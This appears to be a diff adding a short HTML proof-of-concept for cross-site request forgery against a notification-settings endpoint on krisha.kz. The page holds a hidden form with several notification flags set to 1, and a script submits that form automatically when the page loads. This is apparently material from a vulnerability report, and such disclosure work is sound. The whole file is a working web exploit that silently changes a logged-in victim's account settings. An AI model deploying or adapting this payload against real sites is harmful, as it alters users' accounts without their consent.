@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <form action="https://krisha.kz/my/ajax-settings-notifications" method="POST" enctype="application/x-www-form-urlencoded">
+      <input type="hidden" name="advertApprovedNotifications" value="1">
+      <input type="hidden" name="advertDeclinedNotifications" value="1">
+      <input type="hidden" name="advertArchivedNotifications" value="1">
+      <input type="hidden" name="messageNotifications" value="1">
+      <input type="submit" value="Submit CSRF">
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
